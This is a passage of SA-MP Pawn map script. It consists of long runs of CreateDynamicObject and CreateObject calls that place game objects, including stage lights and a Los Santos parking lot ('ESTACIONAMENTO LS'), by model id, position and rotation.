	CreateDynamicObject(1839,-275.3200000,1489.3100000,76.9300000,0.0000000,0.0000000,-125.8800000); //
	CreateDynamicObject(1839,-275.2900000,1489.8800000,76.8900000,0.0000000,0.0000000,-187.4400000); //
	CreateDynamicObject(1839,-275.4300000,1489.4300000,77.3800000,0.1200000,0.0000000,-187.4400000); //
	CreateDynamicObject(1572,-273.6800000,1491.5400000,77.4300000,0.0000000,0.0000000,-48.4800000); //
	CreateDynamicObject(2232,-273.6400000,1491.5800000,77.7400000,0.0000000,0.0000000,134.2200000); //
	CreateDynamicObject(1572,-272.0000000,1493.8300000,77.4300000,0.0000000,0.0000000,-113.4600000); //
	CreateDynamicObject(1839,-271.9500000,1493.7800000,77.1600000,0.1200000,0.0000000,-206.3400000); //
	CreateDynamicObject(19319,-277.9000000,1485.6400000,77.7100000,5.5800000,-11.9400000,50.4000000); //
	CreateDynamicObject(19317,-277.6000000,1484.9000000,77.7800000,0.3000000,-11.4000000,53.2800000); //
	CreateDynamicObject(19319,-277.3700000,1484.0400000,77.7100000,5.5800000,-11.9400000,50.4000000); //
	CreateDynamicObject(19317,-274.3000000,1486.6500000,77.0100000,-90.4800000,71.5800000,-139.4400000); //
	CreateDynamicObject(19319,-278.2800000,1491.7400000,77.8200000,-91.3200000,-33.0600000,86.7600000); //
	CreateDynamicObject(19319,-273.3900000,1485.1800000,76.9800000,-90.1200000,-33.7800000,86.7600000); //
	CreateDynamicObject(19319,-275.1400000,1485.3800000,76.9800000,-90.1200000,-33.7800000,175.9200000); //
	CreateDynamicObject(19317,-276.6800000,1485.4100000,77.0100000,-90.4800000,71.5800000,-227.7600000); //
	CreateDynamicObject(19319,-275.6600000,1484.4000000,76.9800000,-90.1200000,-33.7800000,80.6400000); //
	CreateDynamicObject(2232,-257.8500000,1535.7700000,76.9500000,-38.3400000,89.4600000,-139.6800000); //
	CreateDynamicObject(2232,-252.0100000,1540.9300000,76.9500000,-38.3400000,89.4600000,-166.2000000); //
	CreateDynamicObject(2232,-260.8200000,1533.0100000,76.9500000,-38.3400000,89.4600000,-139.6800000); //
	CreateDynamicObject(2232,-266.2700000,1527.6800000,76.9500000,-38.3400000,89.4600000,-139.6800000); //
	CreateDynamicObject(2232,-269.3900000,1524.9400000,76.9500000,-38.3400000,89.4600000,-139.6800000); //
	CreateDynamicObject(2232,-275.1400000,1519.5700000,76.9500000,-38.3400000,89.4600000,-139.6800000); //
	CreateDynamicObject(2232,-277.9700000,1516.9200000,76.9500000,-38.3400000,89.4600000,-139.6800000); //
	CreateDynamicObject(2232,-283.7500000,1511.6200000,76.9500000,-38.3400000,89.4600000,-139.6800000); //
	CreateDynamicObject(2232,-286.8200000,1508.8100000,76.9500000,-38.3400000,89.4600000,-139.6800000); //
	CreateDynamicObject(2232,-292.3700000,1503.3600000,76.9500000,-38.3400000,89.4600000,-112.3200000); //
	CreateDynamicObject(2232,-270.4400000,1523.0200000,76.9500000,-38.3400000,89.4600000,-162.8400000); //
	CreateDynamicObject(2232,-273.3800000,1520.0800000,76.9500000,-38.3400000,89.4600000,-103.5000000); //
	CreateDynamicObject(2229,-246.3600000,1533.8400000,76.8000000,0.0000000,0.0000000,-107.3400000); //
	CreateDynamicObject(2229,-250.5900000,1526.5300000,76.8000000,0.0000000,0.0000000,-134.9400000); //
	CreateDynamicObject(2229,-255.0900000,1522.7000000,76.8000000,0.0000000,0.0000000,-132.6000000); //
	CreateDynamicObject(2229,-261.1900000,1517.4900000,76.8000000,0.0000000,0.0000000,-138.0600000); //
	CreateDynamicObject(2229,-268.0600000,1511.4400000,76.8000000,0.0000000,0.0000000,-134.5800000); //
	CreateDynamicObject(2229,-272.9000000,1507.3000000,76.8000000,0.0000000,0.0000000,-136.5000000); //
	CreateDynamicObject(2229,-279.4600000,1501.4900000,76.8000000,0.0000000,0.0000000,-134.2800000); //
	CreateDynamicObject(2229,-286.6900000,1497.5400000,76.8000000,0.0000000,0.0000000,-187.0800000); //
	CreateDynamicObject(2232,-279.7400000,1501.5200000,77.4500000,0.0000000,0.0000000,-141.1800000); //
	CreateDynamicObject(2232,-280.2800000,1501.1200000,77.4500000,0.0000000,0.0000000,-141.1800000); //
	CreateDynamicObject(2229,-280.8300000,1500.3800000,76.8000000,0.0000000,0.0000000,-136.9200000); //
	CreateDynamicObject(2232,-273.0700000,1507.2700000,77.4500000,0.0000000,0.0000000,-140.5200000); //
	CreateDynamicObject(2232,-273.5600000,1506.8800000,77.4500000,0.0000000,0.0000000,-141.3000000); //
	CreateDynamicObject(2229,-274.0500000,1506.2500000,76.8000000,0.0000000,0.0000000,-136.6200000); //
	CreateDynamicObject(2232,-268.2800000,1511.3900000,77.4500000,0.0000000,0.0000000,-138.9000000); //
	CreateDynamicObject(2232,-268.7800000,1510.9300000,77.4500000,0.0000000,0.0000000,-139.2600000); //
	CreateDynamicObject(2229,-269.2200000,1510.2300000,76.8000000,0.0000000,0.0000000,-132.8400000); //
	CreateDynamicObject(2232,-260.7100000,1518.2100000,77.4500000,0.0000000,0.0000000,-139.2600000); //
	CreateDynamicObject(2232,-260.2200000,1518.6000000,77.4500000,0.0000000,0.0000000,-139.2600000); //
	CreateDynamicObject(2229,-259.9600000,1518.6500000,76.8000000,0.0000000,0.0000000,-138.0600000); //
	CreateDynamicObject(2232,-255.3000000,1522.7000000,77.4500000,0.0000000,0.0000000,-138.6000000); //
	CreateDynamicObject(2232,-255.8000000,1522.2600000,77.4500000,0.0000000,0.0000000,-138.6000000); //
	CreateDynamicObject(2229,-256.2500000,1521.5900000,76.8000000,0.0000000,0.0000000,-132.8400000); //
	CreateDynamicObject(2232,-250.8500000,1526.5400000,77.4500000,0.0000000,0.0000000,-138.3600000); //
	CreateDynamicObject(2229,-251.8000000,1525.4300000,76.8000000,0.0000000,0.0000000,-135.2400000); //
	CreateDynamicObject(2232,-251.3700000,1526.0400000,77.4500000,0.0000000,0.0000000,-138.3600000); //
	CreateDynamicObject(1783,-250.8700000,1526.5200000,78.1200000,0.0000000,0.0000000,43.0200000); //
	CreateDynamicObject(1783,-251.3300000,1526.1000000,78.1200000,0.0000000,0.0000000,43.0200000); //
	CreateDynamicObject(1783,-255.3600000,1522.7200000,78.1200000,0.0000000,0.0000000,41.9400000); //
	CreateDynamicObject(1783,-255.8200000,1522.3000000,78.1200000,0.0000000,0.0000000,41.9400000); //
	CreateDynamicObject(1783,-260.2500000,1518.6800000,78.1200000,0.0000000,0.0000000,41.9400000); //
	CreateDynamicObject(1783,-260.7300000,1518.2600000,78.1200000,0.0000000,0.0000000,41.9400000); //
	CreateDynamicObject(1783,-268.3300000,1511.4300000,78.1200000,0.0000000,0.0000000,41.4000000); //
	CreateDynamicObject(1783,-268.8000000,1511.0300000,78.1200000,0.0000000,0.0000000,41.4000000); //
	CreateDynamicObject(1783,-273.1100000,1507.3500000,78.1200000,0.0000000,0.0000000,41.4000000); //
	CreateDynamicObject(1783,-273.5800000,1506.9200000,78.1200000,0.0000000,0.0000000,41.4000000); //
	CreateDynamicObject(1783,-279.8200000,1501.5900000,78.1200000,0.0000000,0.0000000,43.1400000); //
	CreateDynamicObject(1783,-280.3400000,1501.1700000,78.1200000,0.0000000,0.0000000,38.4000000); //
	CreateDynamicObject(2232,-276.0300000,1504.7400000,77.4500000,0.0000000,0.0000000,-138.5400000); //
	CreateDynamicObject(2232,-276.5500000,1504.2500000,77.4500000,0.0000000,0.0000000,-138.9600000); //
	CreateDynamicObject(2232,-282.7700000,1498.9500000,77.4500000,0.0000000,0.0000000,-157.2000000); //
	CreateDynamicObject(2232,-283.3900000,1498.6800000,77.4500000,0.0000000,0.0000000,-157.2000000); //
	CreateDynamicObject(2232,-271.6200000,1508.6200000,77.4500000,0.0000000,0.0000000,-138.5400000); //
	CreateDynamicObject(2232,-271.1000000,1509.1000000,77.4500000,0.0000000,0.0000000,-138.5400000); //
	CreateDynamicObject(2232,-258.6100000,1520.0200000,77.4500000,0.0000000,0.0000000,-138.5400000); //
	CreateDynamicObject(2232,-258.1000000,1520.4200000,77.4500000,0.0000000,0.0000000,-138.1800000); //
	CreateDynamicObject(2232,-253.5800000,1524.0000000,77.4500000,0.0000000,0.0000000,-138.1800000); //
	CreateDynamicObject(2232,-253.0100000,1524.4500000,77.4500000,0.0000000,0.0000000,-138.1800000); //
	CreateDynamicObject(2232,-248.0500000,1530.3100000,77.4500000,0.0000000,0.0000000,-110.1600000); //
	CreateDynamicObject(2232,-248.3000000,1529.7700000,77.4500000,0.0000000,0.0000000,-110.1600000); //
	CreateDynamicObject(1841,-248.6600000,1529.2900000,76.8800000,0.0000000,0.0000000,-24.8400000); //
	CreateDynamicObject(1841,-248.0500000,1530.8400000,76.8800000,0.0000000,0.0000000,-21.9600000); //
	CreateDynamicObject(1841,-257.8700000,1520.9100000,76.8800000,0.0000000,0.0000000,-47.3400000); //
	CreateDynamicObject(1841,-259.0800000,1519.8300000,76.8800000,0.0000000,0.0000000,-47.3400000); //
	CreateDynamicObject(1841,-270.8500000,1509.4800000,76.8800000,0.0000000,0.0000000,-47.3400000); //
	CreateDynamicObject(1841,-272.1300000,1508.2900000,76.8800000,0.0000000,0.0000000,-47.3400000); //
	CreateDynamicObject(1841,-282.2600000,1499.2100000,76.8800000,0.0000000,0.0000000,-63.4800000); //
	CreateDynamicObject(1841,-283.8800000,1498.4600000,76.8800000,0.0000000,0.0000000,-67.1400000); //
	CreateDynamicObject(18653,-271.4400000,1521.1200000,78.3600000,-1.7400000,186.8400000,-48.0000000); //
	CreateDynamicObject(19348,-271.2200000,1520.8800000,78.5000000,-124.9800000,-39.3000000,-4.3800000); //
	CreateDynamicObject(2232,-271.1000000,1509.1000000,78.6200000,0.0000000,0.0000000,-138.5400000); //
	CreateDynamicObject(2232,-271.6200000,1508.6200000,78.6200000,0.0000000,0.0600000,-138.5400000); //
	CreateDynamicObject(2232,-276.0300000,1504.7400000,78.5700000,0.0000000,0.0000000,-138.5400000); //
	CreateDynamicObject(2232,-276.5500000,1504.2500000,78.5700000,-0.1800000,0.1200000,-138.9600000); //
	CreateDynamicObject(2232,-283.3900000,1498.6800000,78.6000000,0.0000000,0.0000000,-157.2000000); //
	CreateDynamicObject(2232,-282.7700000,1498.9500000,78.5600000,0.0000000,0.0000000,-157.2000000); //
	CreateDynamicObject(2229,-287.0900000,1497.5900000,76.8000000,0.0000000,0.0000000,-187.2000000); //
	CreateDynamicObject(2232,-258.6100000,1520.0200000,78.6000000,-0.1200000,0.0000000,-138.5400000); //
	CreateDynamicObject(2232,-258.1000000,1520.4200000,78.5600000,-0.4200000,0.0000000,-138.1800000); //
	CreateDynamicObject(2232,-253.0100000,1524.4500000,78.6200000,-0.1200000,0.0000000,-138.1800000); //
	CreateDynamicObject(2232,-253.5800000,1524.0000000,78.6200000,0.0000000,0.0000000,-138.1800000); //
	CreateDynamicObject(2232,-248.3000000,1529.7700000,78.5500000,0.0000000,0.0000000,-110.1600000); //
	CreateDynamicObject(2232,-248.0500000,1530.3100000,78.5500000,0.0000000,0.0000000,-110.1600000); //
	CreateDynamicObject(2229,-246.4700000,1533.4900000,76.8000000,0.0000000,0.0000000,-107.3400000); //
	CreateDynamicObject(1841,-248.0500000,1530.8400000,77.3200000,0.0000000,0.0000000,-21.9600000); //
	CreateDynamicObject(1841,-247.9900000,1531.1400000,76.8800000,0.0000000,0.0000000,-21.9600000); //
	CreateDynamicObject(1841,-248.6600000,1529.2900000,77.3200000,0.0000000,0.0000000,-24.8400000); //
	CreateDynamicObject(1841,-248.8100000,1528.9900000,76.8800000,0.0000000,0.0000000,-25.0200000); //
	CreateDynamicObject(1841,-283.8800000,1498.4600000,77.3400000,-0.2400000,0.0600000,-67.1400000); //
	CreateDynamicObject(1841,-284.1500000,1498.3700000,76.8800000,0.0000000,0.0000000,-67.2000000); //
	CreateDynamicObject(1841,-282.2600000,1499.2100000,77.3300000,0.0000000,0.0000000,-63.4800000); //
	CreateDynamicObject(1841,-281.9800000,1499.3400000,76.8800000,0.0000000,0.0000000,-63.4800000); //
	CreateDynamicObject(18102,-276.1400000,1500.2500000,82.8400000,32.3400000,-7.4400000,22.6800000); //
	CreateDynamicObject(18102,-250.0400000,1527.7300000,82.8400000,32.3400000,-7.4400000,53.7000000); //
	CreateDynamicObject(2780,-254.1300000,1517.6300000,76.9000000,0.0000000,0.0000000,-120.9000000); //
	CreateDynamicObject(2780,-270.4600000,1503.8300000,76.9000000,0.0000000,0.0000000,-143.1600000); //
	CreateDynamicObject(18717,-254.6100000,1501.8000000,76.9100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(18717,-251.7500000,1504.2000000,76.9100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(968,-279.1900000,1519.8000000,72.3500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(968,-275.3400000,1518.9300000,81.2300000,-0.6600000,-114.8400000,-13.6800000); //
	CreateDynamicObject(1886,-275.2400000,1518.9400000,81.2000000,21.2400000,0.4200000,119.8800000); //
	CreateDynamicObject(968,-289.6000000,1513.0600000,72.3500000,0.0000000,0.0000000,-77.5200000); //
	CreateDynamicObject(968,-289.6900000,1508.9000000,81.2300000,-0.6600000,-114.8400000,-92.7000000); //
	CreateDynamicObject(1886,-289.5800000,1508.8300000,81.2000000,21.2400000,0.4200000,23.2800000); //
	CreateDynamicObject(968,-261.1300000,1537.9600000,72.3500000,0.0000000,0.0000000,-45.1200000); //
	CreateDynamicObject(968,-257.4100000,1537.0400000,81.2300000,-0.6600000,-114.8400000,-13.6800000); //
	CreateDynamicObject(1886,-257.3800000,1536.9800000,81.3800000,12.5400000,-0.7800000,61.4400000); //
	CreateDynamicObject(3578,-257.2100000,1543.2500000,75.0600000,0.0000000,0.0000000,41.7000000); //
	CreateDynamicObject(3578,-264.7300000,1536.4700000,75.0600000,0.0000000,0.0000000,42.9000000); //
	CreateDynamicObject(3578,-267.7800000,1533.3900000,75.0600000,0.0000000,0.0000000,43.0200000); //
	CreateDynamicObject(3578,-283.9000000,1518.9400000,75.0600000,0.0000000,0.0000000,42.3000000); //
	CreateDynamicObject(3578,-287.2700000,1515.8700000,75.0600000,0.0000000,0.0000000,42.0600000); //
	CreateDynamicObject(3578,-292.9300000,1508.0400000,75.0600000,0.0000000,0.0000000,65.5200000); //
	CreateDynamicObject(3578,-248.7100000,1546.7700000,75.0600000,0.0000000,0.0000000,2.1600000); //
	CreateDynamicObject(3864,-252.6200000,1551.8300000,79.9900000,0.0000000,0.0000000,33.8400000); //
	CreateDynamicObject(3864,-266.8600000,1566.1200000,79.1700000,0.0000000,0.0000000,34.8600000); //
	CreateDynamicObject(3864,-282.6300000,1579.4800000,79.6700000,0.0000000,0.0000000,57.4200000); //
	CreateDynamicObject(3864,-318.2200000,1561.2200000,80.3200000,0.0000000,0.0000000,161.0400000); //
	CreateDynamicObject(3406,-273.4000000,1524.5800000,74.8300000,0.0000000,0.0000000,131.6400000); //
	CreateDynamicObject(3406,-274.8100000,1523.2200000,74.8300000,0.0000000,0.0000000,131.6400000); //
	CreateDynamicObject(3406,-280.6900000,1529.8300000,74.8300000,0.0000000,0.0000000,131.6400000); //
	CreateDynamicObject(3406,-279.1400000,1531.1100000,74.8300000,0.0000000,0.0000000,131.6400000); //
	CreateDynamicObject(3406,-276.4600000,1529.9500000,74.8300000,0.0000000,0.0000000,122.1600000); //
	CreateDynamicObject(3406,-279.9800000,1527.1400000,74.8300000,0.0000000,0.0000000,141.0000000); //
	CreateDynamicObject(3526,-269.5900000,1523.7000000,76.9900000,0.0000000,0.0000000,-47.4600000); //
	CreateDynamicObject(18653,-280.8900000,1531.6300000,78.1400000,-1.7400000,186.8400000,-48.0000000); //
	CreateDynamicObject(19348,-280.6900000,1531.3700000,78.2800000,-124.9800000,-39.3000000,-4.3800000); //
	CreateDynamicObject(2232,-280.1600000,1526.3000000,76.9500000,-38.3400000,89.4600000,-62.3400000); //
	CreateDynamicObject(2232,-282.5600000,1528.9500000,76.9500000,-38.3400000,89.4600000,-100.4400000); //
	CreateDynamicObject(2232,-276.2900000,1530.2700000,76.9500000,-38.3400000,89.4600000,-217.0800000); //
	CreateDynamicObject(2232,-277.8500000,1532.6100000,76.9500000,-38.3400000,89.4600000,-187.9800000); //
	CreateDynamicObject(3526,-280.0100000,1532.8100000,76.9900000,0.0000000,0.0000000,-83.5800000); //
	CreateDynamicObject(3526,-282.4400000,1530.8100000,76.9900000,0.0000000,0.0000000,-22.3200000); //
	CreateDynamicObject(2350,-280.4100000,1531.0500000,77.2600000,0.0000000,0.0000000,38.3400000); //
	CreateDynamicObject(3526,-280.9500000,1527.2800000,76.9900000,0.0000000,0.0000000,-1.6800000); //
	CreateDynamicObject(3526,-277.1700000,1531.1000000,76.9900000,0.0000000,0.0000000,-97.5000000); //
	CreateDynamicObject(3526,-274.7000000,1528.0300000,76.9900000,0.0000000,0.0000000,-97.5000000); //
	CreateDynamicObject(3526,-278.4100000,1525.0400000,76.9900000,0.0000000,0.0000000,-1.6800000); //
	CreateDynamicObject(19319,-280.2300000,1531.3100000,77.5400000,-9.3600000,1.9200000,141.3600000); //
	CreateDynamicObject(19319,-271.5800000,1509.2600000,77.5400000,-9.3600000,1.9200000,224.6400000); //
	CreateDynamicObject(19317,-256.4800000,1522.3200000,77.6300000,-14.1000000,-2.6400000,-141.1200000); //
	CreateDynamicObject(16082,-252.9100000,1519.4000000,80.8300000,0.0000000,0.0000000,44.7600000); //
	CreateDynamicObject(16082,-272.6700000,1503.5600000,80.8300000,0.0000000,0.0000000,215.8200000); //
	CreateDynamicObject(3578,-275.2300000,1533.0800000,75.0600000,0.0000000,0.0000000,-39.8400000); //
	CreateDynamicObject(3578,-282.5700000,1533.1400000,75.0600000,0.0000000,0.0000000,43.0200000); //
	CreateDynamicObject(3578,-283.0300000,1526.0800000,75.0600000,0.0000000,0.0000000,127.5000000); //
	CreateDynamicObject(3819,-272.9500000,1537.6200000,75.2600000,0.0000000,0.0000000,54.5400000); //
	CreateDynamicObject(3819,-266.0200000,1545.8700000,75.2600000,0.0000000,0.0000000,54.5400000); //
	CreateDynamicObject(3819,-278.8000000,1552.2000000,75.2600000,0.0000000,0.0000000,88.9800000); //
	CreateDynamicObject(3819,-283.7900000,1540.9600000,75.2600000,0.0000000,0.0000000,100.8600000); //
	CreateDynamicObject(3819,-293.5200000,1530.5400000,75.2600000,0.0000000,0.0000000,165.8400000); //
	CreateDynamicObject(3819,-289.9900000,1521.1000000,75.2600000,0.0000000,0.0000000,218.1000000); //
	CreateDynamicObject(3819,-297.0400000,1514.6800000,75.2600000,0.0000000,0.0000000,218.1000000); //
	CreateDynamicObject(3819,-303.3300000,1529.2700000,75.2600000,0.0000000,0.0000000,181.0200000); //
	CreateDynamicObject(3819,-309.0000000,1517.3800000,75.2600000,0.0000000,0.0000000,216.0600000); //
	CreateDynamicObject(3819,-292.2300000,1548.2500000,75.2600000,0.0000000,0.0000000,132.1200000); //
	CreateDynamicObject(3819,-286.4600000,1558.7700000,75.2600000,0.0000000,0.0000000,101.8800000); //
	CreateDynamicObject(3819,-313.5200000,1527.9300000,75.2600000,0.0000000,0.0000000,173.7000000); //
	CreateDynamicObject(3864,-318.9700000,1505.1700000,80.1400000,0.0000000,0.0000000,249.7200000); //
	CreateDynamicObject(3864,-310.3600000,1496.0200000,80.5200000,0.0000000,0.0000000,249.7200000); //
	CreateDynamicObject(3819,-295.1700000,1569.8900000,75.2600000,0.0000000,0.0000000,110.4000000); //
	CreateDynamicObject(3819,-300.6200000,1559.0600000,75.2600000,0.0000000,0.0000000,130.3800000); //
	CreateDynamicObject(3819,-324.4600000,1529.7200000,75.2600000,0.0000000,0.0000000,169.1400000); //
	CreateDynamicObject(3819,-322.5300000,1518.4400000,75.2600000,0.0000000,0.0000000,207.1800000); //
	CreateDynamicObject(3819,-306.8900000,1568.3900000,75.2600000,0.0000000,0.0000000,131.2800000); //
	CreateDynamicObject(16000,-237.1200000,1541.6800000,72.6800000,-3.9600000,4.3800000,81.6600000); //
	CreateDynamicObject(16000,-293.9200000,1488.1400000,73.8500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(13629,-251.8900000,1496.3800000,94.4700000,0.0000000,0.0000000,132.9600000); //
	CreateDynamicObject(3406,-257.1600000,1495.7800000,80.0000000,0.0000000,0.0000000,42.7800000); //
	CreateDynamicObject(3406,-250.6200000,1501.6200000,80.0000000,0.0000000,0.0000000,40.8600000); //
	CreateDynamicObject(2596,-276.2700000,1518.9000000,76.4000000,0.0000000,0.0000000,-87.2400000); //
	CreateDynamicObject(2596,-268.8300000,1526.0300000,76.4000000,0.0000000,0.0000000,-177.3600000); //
	//These are the lights in case you want to script them to change color or move
	CreateObject(18656,-249.6100000,1533.8200000,93.7200000,58.8600000,-67.0200000,15.1200000, 50000.0); //
	CreateObject(18656,-286.6500000,1504.2500000,93.7200000,58.8600000,-67.0200000,67.2600000, 50000.0); //
	CreateDynamicObject(18656,-241.7900000,1530.3300000,93.6800000,-90.9600000,-45.9000000,15.1200000); //
	CreateDynamicObject(18656,-282.9300000,1493.2500000,93.6800000,-90.9600000,-45.9000000,-100.8000000); //
	CreateDynamicObject(18657,-248.8000000,1520.9000000,93.7100000,-90.3600000,70.8600000,0.0000000); //
	CreateDynamicObject(18658,-273.9600000,1497.7000000,93.6800000,-91.2000000,36.1200000,-60.8400000); //
	// ESTACIONAMENTO LS
	CreateObject(11317, 1263.12732, -1211.25598, 23.60110,   0.00000, 0.00000, 90.00000);
	CreateObject(6959, 1246.91406, -1250.94775, 12.59090,   0.00000, 0.00000, 0.00000);
	CreateObject(6959, 1288.22888, -1250.94775, 12.59090,   0.00000, 0.00000, 0.00000);
	CreateObject(6959, 1226.20178, -1251.06860, -6.82344,   3.90000, -90.00000, 0.00000);
	CreateObject(6959, 1226.20276, -1227.15076, -4.45620,   6.06000, -90.00000, 0.00000);
	CreateObject(6959, 1312.00110, -1250.94775, 12.59290,   0.00000, 0.00000, 0.00000);
	CreateObject(6959, 1246.91406, -1211.00928, 12.59090,   0.00000, 0.00000, 0.00000);
	CreateObject(6959, 1246.88843, -1208.47571, 12.41740,   17.52000, 0.00000, 0.00000);
	CreateObject(6959, 1226.20178, -1194.63660, -1.00295,   6.06000, -90.00000, 0.00000);
	CreateObject(6959, 1246.87720, -1169.47522, 18.40420,   0.00000, 0.00000, 0.00000);
	CreateObject(6959, 1311.55396, -1184.34644, 18.40420,   0.00000, 0.00000, 0.00000);
	CreateObject(6959, 1280.42725, -1184.34241, 18.40320,   0.00000, 0.00000, 0.00000);
	CreateObject(6959, 1311.55396, -1210.90320, 18.40320,   0.00000, 0.00000, 0.00000);
	CreateObject(6959, 1312.62878, -1230.85510, -2.29760,   0.00000, 90.00000, 90.00000);
	CreateObject(6959, 1332.52722, -1210.88147, -2.29760,   0.00000, 90.00000, 180.17999);
	CreateObject(6959, 1311.95435, -1210.89246, 18.40220,   0.00000, 0.00000, 0.00000);
	CreateObject(6959, 1352.90332, -1170.91150, 18.40420,   0.00000, 0.00000, 0.00000);
	CreateObject(6959, 1312.69775, -1171.98096, 2.16222,   0.00000, 90.00000, 90.00000);
	CreateObject(6959, 1272.71326, -1171.98096, 2.16220,   0.00000, 90.00000, 90.00000);
	CreateObject(6959, 1246.18127, -1171.98206, 2.16220,   0.00000, 90.00000, 90.00000);
	CreateObject(6959, 1226.20178, -1156.95520, 1.22220,   0.00000, -90.00000, 0.00000);
	CreateObject(6959, 1312.04443, -1152.00269, 22.66735,   0.00000, 0.00000, 0.00000);
	CreateObject(6959, 1256.72864, -1151.97913, 22.42735,   0.00000, 0.00000, 0.00000);
	CreateObject(6959, 1332.68201, -1188.04077, -1.00341,   10.20000, 90.00000, 0.00000);
	CreateObject(6959, 1349.84680, -1157.17542, 1.98200,   0.00000, 90.00000, 0.00000);
	CreateObject(6959, 1330.97375, -1146.94714, 1.98200,   0.00000, 90.00000, 61.50001);
	CreateObject(6959, 1349.85803, -1168.74719, 0.65141,   0.00000, 90.00000, -54.24000);
	CreateDynamicObject(8406, 1256.35400, -1270.85400, 17.93440,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1229.50024, -1270.85400, 14.22684,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1227.84033, -1270.85400, 11.81227,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1231.04126, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1234.24524, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1237.44946, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1240.61169, -1270.85461, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1243.79260, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1245.63367, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1272.23059, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1275.43103, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1278.62952, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1281.83167, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1285.03186, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1288.22021, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1291.40344, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1294.58826, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1297.79236, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1300.97803, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1304.17859, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1307.37915, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1310.56262, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1313.76563, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1316.96667, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1320.16626, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1323.36694, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1326.54590, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1329.74866, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1331.05127, -1270.85400, 11.81230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1332.56226, -1269.19287, 11.81230,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.56226, -1265.98279, 11.81230,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.56226, -1262.78040, 11.81230,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.56226, -1259.57947, 11.81230,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.56226, -1256.37646, 11.81230,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.56226, -1253.17517, 11.81230,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.56226, -1249.99451, 11.81230,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.56226, -1246.78528, 11.81230,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.56226, -1243.58276, 11.81230,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.56226, -1240.40039, 11.81230,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.56226, -1237.21826, 11.81230,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.56226, -1234.01550, 11.81230,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.56226, -1232.48816, 11.81230,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1235.90576, -1270.85400, 14.22680,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1242.30615, -1270.85400, 14.22680,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1243.90076, -1270.85400, 14.22680,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1274.01221, -1270.85400, 14.22680,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1280.41565, -1270.85400, 14.22680,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1286.82300, -1270.85400, 14.22680,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1293.22705, -1270.85400, 14.22680,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1299.62891, -1270.85400, 14.22680,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1306.02209, -1270.85400, 14.22680,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1312.42346, -1270.85400, 14.22680,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1318.82471, -1270.85400, 14.22680,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1325.23059, -1270.85400, 14.22680,   0.00000, 0.00000, 90.00000);
